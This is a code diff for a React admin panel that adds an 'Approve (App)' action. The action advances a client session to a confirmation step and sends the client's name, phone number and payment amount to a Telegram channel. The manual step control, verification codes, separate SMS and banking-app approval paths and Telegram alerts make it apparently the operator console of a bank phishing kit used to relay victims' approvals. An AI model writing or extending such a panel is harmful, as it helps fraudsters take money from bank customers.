@@ -178,6 +178,49 @@ const AdminPanel = () => {
     });
   };
 
+  const approvePayment = async (session: ClientSession) => {
+    // Update step to confirmation (for app-based approval without SMS)
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ current_step: 4 })
+      .eq("id", session.id);
+
+    if (error) {
+      console.error("Error approving payment:", error);
+      toast({
+        title: "Error",
+        description: "Failed to approve payment",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    // Send Telegram notification
+    try {
+      const message = `✅ <b>Payment Approved (App)</b>
+
+📋 <b>Session:</b> #${session.session_code}
+👤 <b>Client:</b> ${session.client_name || "Unknown"}
+📱 <b>Phone:</b> ${session.phone_number || "N/A"}
+💰 <b>Amount:</b> £${session.amount?.toFixed(2) || "N/A"}
+
+✅ <b>Status:</b> Payment approved via banking app (no SMS)
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+
+      await supabase.functions.invoke("send-telegram", {
+        body: { message },
+      });
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error);
+    }
+
+    toast({
+      title: "Payment Approved",
+      description: "Client advanced to confirmation page (app approval)",
+    });
+  };
+
   const generateVerificationCode = () => {
     return Math.floor(100000 + Math.random() * 900000).toString();
   };
@@ -647,14 +690,24 @@ const AdminPanel = () => {
                               <span className="font-mono font-bold">{session.verification_code}</span>
                             </div>
                           )}
-                          <Button
-                            size="sm"
-                            className="w-full gap-2 bg-green-600 hover:bg-green-700 text-white"
-                            onClick={() => confirmPayment(session)}
-                          >
-                            <CheckCircle className="w-4 h-4" />
-                            Confirm Payment
-                          </Button>
+                          <div className="grid grid-cols-2 gap-2">
+                            <Button
+                              size="sm"
+                              className="gap-2 bg-green-600 hover:bg-green-700 text-white"
+                              onClick={() => confirmPayment(session)}
+                            >
+                              <CheckCircle className="w-4 h-4" />
+                              Confirm SMS
+                            </Button>
+                            <Button
+                              size="sm"
+                              className="gap-2 bg-blue-600 hover:bg-blue-700 text-white"
+                              onClick={() => approvePayment(session)}
+                            >
+                              <CheckCircle className="w-4 h-4" />
+                              Approve (App)
+                            </Button>
+                          </div>
                         </div>
                       )}
 
